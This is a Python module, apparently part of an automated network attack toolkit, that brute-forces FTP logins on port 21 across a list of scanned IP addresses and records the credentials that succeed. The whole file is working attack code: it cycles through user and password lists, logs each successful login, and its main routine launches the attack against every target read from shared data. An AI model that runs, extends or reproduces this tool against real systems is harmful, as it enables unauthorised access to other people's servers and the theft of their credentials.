import os
import csv
import threading
import logging
import time
from ftplib import FTP
from queue import Queue
from shared import SharedData
from logger import Logger
from actions.base_connector import BaseConnector, BaseBruteforce

logger = Logger(name="ftp_connector.py", level=logging.DEBUG)

b_class = "FTPBruteforce"
b_module = "ftp_connector"
b_status = "brute_force_ftp"
b_port = 21
b_parent = None

class FTPBruteforce(BaseBruteforce):
    def __init__(self, shared_data):
        super().__init__(shared_data, FTPConnector(shared_data))

    def execute(self, ip, port, row, status_key):
        self.shared_data.orch_status = "FTPBruteforce"
        time.sleep(5)
        logger.info(f"Brute forcing FTP on {ip}:{port}...")
        success, results = self.run(ip, port)
        return 'success' if success else 'failed'

class FTPConnector(BaseConnector):
    PORT = 21
    SERVICE_NAME = "FTP"

    @property
    def output_file(self):
        return self.shared_data.ftpfile

    def _get_total_tasks(self):
        return len(self.users) * len(self.passwords) + 1

    def connect(self, ip, user, password):
        try:
            conn = FTP()
            conn.connect(ip, 21)
            conn.login(user, password)
            conn.quit()
            logger.info(f"Access to FTP successful on {ip} with user '{user}'")
            return True
        except Exception:
            return False

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        ftp_bruteforce = FTPBruteforce(shared_data)
        logger.info("[bold green]Starting FTP attack...on port 21[/bold green]")
        ips_to_scan = shared_data.read_data()
        for row in ips_to_scan:
            ip = row["IPs"]
            ftp_bruteforce.execute(ip, b_port, row, b_status)
        logger.info(f"Total successful attempts: {len(ftp_bruteforce.connector.results)}")
        exit(len(ftp_bruteforce.connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
